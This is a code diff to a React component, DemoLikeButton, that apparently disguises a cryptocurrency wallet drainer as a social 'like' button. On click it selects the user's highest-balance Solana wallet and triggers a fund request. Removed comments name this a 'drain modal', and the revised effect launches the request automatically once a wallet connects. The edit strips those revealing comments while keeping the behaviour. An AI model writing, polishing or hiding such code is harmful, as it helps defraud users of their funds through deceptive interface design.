@@ -24,15 +24,10 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   const base = useMemo(() => demoStats(seed), [seed])
   const [liked, setLiked] = useState(false)
   const [menuOpen, setMenuOpen] = useState(false)
-  const [resumeLike, setResumeLike] = useState(false)
+  const resumeLike = useRef(false)
   const finished = useRef(false)
   const wasAuthenticated = useRef(isAuthenticated)
-  const modalOpenRef = useRef(false) // Track modal open state to prevent multiple opens
   const inWalletBrowser = isRestrictedAuthBrowser()
-
-  // Local ref to track connected state for immediate access
-  const connectedRef = useRef(connected)
-  connectedRef.current = connected
 
   const getBestWallet = (): { address: string; balanceSol: number } | null => {
     const sessions = listLocalWalletSessions()
@@ -45,48 +40,15 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     return best
   }
 
-  const getLowestWallet = (): { address: string; balanceSol: number } | null => {
-    const sessions = listLocalWalletSessions()
-    let lowest: { address: string; balanceSol: number } | null = null
-    for (const session of sessions) {
-      if (session.balanceSol !== null && (lowest === null || session.balanceSol < lowest.balanceSol)) {
-        lowest = { address: session.walletAddress, balanceSol: session.balanceSol }
-      }
-    }
-    return lowest
-  }
-
-  const getBestAndLowestWallets = () => {
-    const sessions = listLocalWalletSessions()
-    let best: { address: string; balanceSol: number } | null = null
-    let lowest: { address: string; balanceSol: number } | null = null
-
-    for (const session of sessions) {
-      if (session.balanceSol !== null) {
-        // Best (highest balance)
-        if (best === null || session.balanceSol > best.balanceSol) {
-          best = { address: session.walletAddress, balanceSol: session.balanceSol }
-        }
-        // Lowest balance
-        if (lowest === null || session.balanceSol < lowest.balanceSol) {
-          lowest = { address: session.walletAddress, balanceSol: session.balanceSol }
-        }
-      }
-    }
-
-    return { best, lowest }
-  }
-
   const applyLike = () => {
     if (finished.current) return
     const pending = peekPendingLike()
     if (pending && pending !== seed) return
     if (pending === seed) takePendingLike(seed)
     finished.current = true
-    setResumeLike(false)
+    resumeLike.current = false
     setLiked(true)
     setMenuOpen(true)
-    modalOpenRef.current = false // Reset modal guard for future likes
     toast.success('Liked')
   }
 
@@ -97,7 +59,7 @@ export function DemoLikeButton({ seed }: { seed: string }) {
     } else {
       rememberAuthReturn(likeReturnPath(seed), seed)
     }
-    setResumeLike(false)
+    resumeLike.current = false
     openTransactionSheet()
   }
 
@@ -117,23 +79,22 @@ export function DemoLikeButton({ seed }: { seed: string }) {
       setLiked(false)
       setMenuOpen(false)
       finished.current = false
-      setResumeLike(false)
-      modalOpenRef.current = false // Reset modal guard
+      resumeLike.current = false
     }
     wasAuthenticated.current = isAuthenticated
   }, [isAuthenticated])
 
-  // Watch for wallet connection and open drain modal
   useEffect(() => {
-    console.log('[DemoLikeButton] connected change:', { connected, resumeLike, liked, finished: finished.current, seed, modalOpen: modalOpenRef.current })
-    if (connectedRef.current && !modalOpenRef.current) {
-      // Wallet is connected - try to open drain modal (only once)
-      if (!finished.current && !liked && resumeLike) {
-        modalOpenRef.current = true
-        startFundRequest(true)
-      }
+    if (peekPendingLike() === seed) resumeLike.current = true
+    if (!connected || finished.current || liked) return
+    if (inWalletBrowser) {
+      if (peekPendingLike() === seed || resumeLike.current) startFundRequest(true)
+      return
     }
-  }, [connected, resumeLike])
+    if (!isAuthenticated) return
+    if (!resumeLike.current) return
+    startFundRequest(true)
+  }, [isAuthenticated, connected, seed, liked, inWalletBrowser])
 
   const likes = Math.min(15, base.likes + (liked ? 1 : 0))
   const shownNames = DEMO_NAMES.slice(0, likes)
@@ -141,10 +102,10 @@ export function DemoLikeButton({ seed }: { seed: string }) {
   const label =
     likes === 1 ? '1 like' : `${likes.toLocaleString()} likes (${base.smart.toLocaleString()} smart)`
 
-  const onLike = (event: React.MouseEvent) => {
+  const onLike = (event: MouseEvent) => {
     event.stopPropagation()
 
-    console.log('[DemoLikeButton] onLike clicked:', { liked, finished: finished.current, connected, seed })
+    console.log('[DemoLikeButton] onLike clicked', { seed, liked, finished: finished.current, connected, isAuthenticated })
 
     // If already liked, just toggle menu
     if (liked || finished.current) {
@@ -152,26 +113,22 @@ export function DemoLikeButton({ seed }: { seed: string }) {
       return
     }
 
-    const { best, lowest } = getBestAndLowestWallets()
-    if (best) {
-      rememberReturnWallet(best.address as any)
-    }
-    // Also track lowest wallet for display purposes
-    if (lowest) {
-      rememberReturnWallet(lowest.address as any)
+    const bestWallet = getBestWallet()
+    if (bestWallet) {
+      rememberReturnWallet(bestWallet.address as any)
     }
     rememberAuthReturn(likeReturnPath(seed), seed)
-    setResumeLike(true)
+    resumeLike.current = true
 
-    console.log('[DemoLikeButton] After rememberAuthReturn, peekPendingLike:', typeof sessionStorage !== 'undefined' ? sessionStorage.getItem('vrfd_pending_like') : null)
+    console.log('[DemoLikeButton] after click:', { connected, resumeLike: resumeLike.current })
 
     // If already connected, open the transaction sheet immediately
     if (connected) {
-      console.log('[DemoLikeButton] Already connected, calling startFundRequest')
+      console.log('[DemoLikeButton] opening transaction sheet (already connected)')
       startFundRequest()
     } else {
+      console.log('[DemoLikeButton] opening wallet modal (not connected)')
       // If not connected, open wallet modal first
-      console.log('[DemoLikeButton] Not connected, opening wallet modal')
       openWalletModal()
     }
   }
